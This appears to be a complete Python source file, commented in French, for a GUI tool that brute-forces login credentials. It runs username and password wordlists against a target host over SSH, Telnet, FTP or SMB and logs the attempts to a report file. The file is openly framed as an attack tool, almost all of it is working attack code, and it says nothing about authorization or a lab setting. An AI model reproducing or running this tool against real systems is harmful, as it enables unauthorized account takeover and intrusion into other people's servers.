import os
import threading
import tkinter as tk
from tkinter import filedialog, messagebox
import datetime

# Importations pour chaque protocole
try:
    import paramiko
except ImportError:
    print("Veuillez installer paramiko (pip install paramiko)")
try:
    import telnetlib
except ImportError:
    print("telnetlib est intégré à Python")
try:
    from ftplib import FTP
except ImportError:
    print("Erreur d'importation de ftplib")
try:
    from smb.SMBConnection import SMBConnection
except ImportError:
    print("Veuillez installer pysmb (pip install pysmb)")

# Fonction de journalisation
rapport_path = "rapport.txt"
def log_to_report(protocol, user, password, result, file_path=rapport_path):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(file_path, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] {protocol} | {user}:{password} -> {result}\n")

# Définir la fonction start_attack() avant de créer le bouton
def start_attack():
    host = entry_host.get()
    protocol = protocol_var.get()
    attack_type = attack_type_var.get()
    users_file = entry_users.get()
    passwords_file = entry_passwords.get()

    try:
        with open(users_file, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except:
        messagebox.showerror("Erreur", "Fichier utilisateurs non trouvé ou invalide.")
        return

    try:
        with open(passwords_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except:
        messagebox.showerror("Erreur", "Fichier mots de passe non trouvé ou invalide.")
        return

    # Initialiser le fichier rapport
    with open(rapport_path, 'w', encoding='utf-8') as f:
        f.write("=== Rapport d'attaque multi-protocole ===\n")
        f.write(f"Date : {datetime.datetime.now()}\n")
        f.write(f"Hôte : {host}\n")
        f.write(f"Protocole : {protocol}\n")
        f.write(f"Type d'attaque : {attack_type}\n")
        f.write("=========================================\n\n")

    def run():
        output_text.delete(1.0, tk.END)
        if attack_type == "Brute force":
            if protocol == "SSH":
                attack_ssh(host, users, passwords, output_text)
            elif protocol == "Telnet":
                attack_telnet(host, users, passwords, output_text)
            elif protocol == "FTP":
                attack_ftp(host, users, passwords, output_text)
            elif protocol == "SMB":
                attack_smb(host, users, passwords, output_text)
        elif attack_type == "Scan":
            output_text.insert(tk.END, "Fonctionnalité de scan à implémenter...\n")
        else:
            output_text.insert(tk.END, "Type d'attaque non supporté.\n")

    threading.Thread(target=run).start()

# Fonctions d'attaque avec logging
def attack_ssh(host, users, passwords, output_text):
    import paramiko
    for user in users:
        for password in passwords:
            try:
                output_text.insert(tk.END, f"SSH : Tentative avec {user}:{password}\n")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname=host, username=user, password=password, timeout=5)
                output_text.insert(tk.END, f"Succès SSH : {user}:{password}\n")
                log_to_report("SSH", user, password, "Succès")
                client.close()
                return
            except paramiko.AuthenticationException:
                output_text.insert(tk.END, "Échec SSH\n")
                log_to_report("SSH", user, password, "Échec")
            except Exception as e:
                output_text.insert(tk.END, f"Erreur SSH : {e}\n")
                log_to_report("SSH", user, password, f"Erreur : {e}")

def attack_telnet(host, users, passwords, output_text):
    import telnetlib
    import time
    for user in users:
        for password in passwords:
            try:
                output_text.insert(tk.END, f"Telnet : Tentative avec {user}:{password}\n")
                tn = telnetlib.Telnet(host, 23, timeout=5)
                tn.read_until(b"login: ", timeout=5)
                tn.write(user.encode('ascii') + b"\n")
                tn.read_until(b"Password: ", timeout=5)
                tn.write(password.encode('ascii') + b"\n")
                time.sleep(1)
                output = tn.read_very_eager()
                if b"Welcome" in output or b">" in output or b"Login incorrect" not in output:
                    output_text.insert(tk.END, f"Succès Telnet : {user}:{password}\n")
                    log_to_report("Telnet", user, password, "Succès")
                    tn.close()
                    return
                tn.close()
                log_to_report("Telnet", user, password, "Échec")
            except Exception as e:
                output_text.insert(tk.END, f"Erreur Telnet : {e}\n")
                log_to_report("Telnet", user, password, f"Erreur : {e}")

def attack_ftp(host, users, passwords, output_text):
    from ftplib import FTP
    for user in users:
        for password in passwords:
            try:
                output_text.insert(tk.END, f"FTP : Tentative avec {user}:{password}\n")
                ftp = FTP(host, timeout=5)
                ftp.login(user=user, passwd=password)
                output_text.insert(tk.END, f"Succès FTP : {user}:{password}\n")
                log_to_report("FTP", user, password, "Succès")
                ftp.quit()
                return
            except Exception as e:
                output_text.insert(tk.END, f"Erreur FTP : {e}\n")
                log_to_report("FTP", user, password, f"Erreur : {e}")

def attack_smb(host, users, passwords, output_text):
    from smb.SMBConnection import SMBConnection
    for user in users:
        for password in passwords:
            try:
                output_text.insert(tk.END, f"SMB : Tentative avec {user}:{password}\n")
                conn = SMBConnection(user, password, "client_machine", "server_name", use_ntlm_v2=True)
                if conn.connect(host, 445):
                    output_text.insert(tk.END, f"Succès SMB : {user}:{password}\n")
                    log_to_report("SMB", user, password, "Succès")
                    conn.close()
                    return
                conn.close()
                log_to_report("SMB", user, password, "Échec")
            except Exception as e:
                output_text.insert(tk.END, f"Erreur SMB : {e}\n")
                log_to_report("SMB", user, password, f"Erreur : {e}")

# Fonction pour parcourir les fichiers
def browse_file(entry_widget):
    filename = filedialog.askopenfilename()
    if filename:
        entry_widget.delete(0, tk.END)
        entry_widget.insert(0, filename)

# Interface graphique uniquement si disponible
if os.environ.get('DISPLAY'):
    root = tk.Tk()

    root.title("Outil multi-protocole avec menu")

    menubar = tk.Menu(root)
    attack_menu = tk.Menu(menubar, tearoff=0)

    attack_type_var = tk.StringVar(value="Brute force")
    attack_menu.add_radiobutton(label="Brute force", variable=attack_type_var, value="Brute force")
    attack_menu.add_radiobutton(label="Scan", variable=attack_type_var, value="Scan")
    menubar.add_cascade(label="Type d'attaque", menu=attack_menu)

    root.config(menu=menubar)

    protocol_var = tk.StringVar(value="SSH")

    tk.Label(root, text="Adresse IP / Host :").grid(row=0, column=0, padx=5, pady=5, sticky='e')
    entry_host = tk.Entry(root, width=30)
    entry_host.insert(0, "192.168.1.100")
    entry_host.grid(row=0, column=1, padx=5, pady=5)

    tk.Label(root, text="Protocole :").grid(row=1, column=0, padx=5, pady=5, sticky='e')
    tk.Radiobutton(root, text="SSH", variable=protocol_var, value="SSH").grid(row=1, column=1, sticky='w')
    tk.Radiobutton(root, text="Telnet", variable=protocol_var, value="Telnet").grid(row=1, column=1)
    tk.Radiobutton(root, text="FTP", variable=protocol_var, value="FTP").grid(row=1, column=1, sticky='e')
    tk.Radiobutton(root, text="SMB", variable=protocol_var, value="SMB").grid(row=1, column=2, sticky='w')

    tk.Label(root, text="Fichier utilisateurs :").grid(row=2, column=0, padx=5, pady=5, sticky='e')
    entry_users = tk.Entry(root, width=30)
    entry_users.insert(0, "users.txt")
    entry_users.grid(row=2, column=1, padx=5, pady=5)
    btn_browse_users = tk.Button(root, text="Parcourir", command=lambda: browse_file(entry_users))
    btn_browse_users.grid(row=2, column=2, padx=5, pady=5)

    tk.Label(root, text="Fichier mots de passe :").grid(row=3, column=0, padx=5, pady=5, sticky='e')
    entry_passwords = tk.Entry(root, width=30)
    entry_passwords.insert(0, "passwords.txt")
    entry_passwords.grid(row=3, column=1, padx=5, pady=5)
    btn_browse_passwords = tk.Button(root, text="Parcourir", command=lambda: browse_file(entry_passwords))
    btn_browse_passwords.grid(row=3, column=2, padx=5, pady=5)

    btn_start = tk.Button(root, text="Démarrer l'attaque", command=start_attack)
    btn_start.grid(row=4, column=1, padx=5, pady=10)

    output_text = tk.Text(root, height=20, width=80)
    output_text.grid(row=5, column=0, columnspan=3, padx=5, pady=5)

    root.mainloop()
else:
    print("Aucun affichage graphique détecté. L'interface ne sera pas lancée.")
    print("L'interface graphique n'a pas été lancée. Le script peut fonctionner en mode console si nécessaire.")
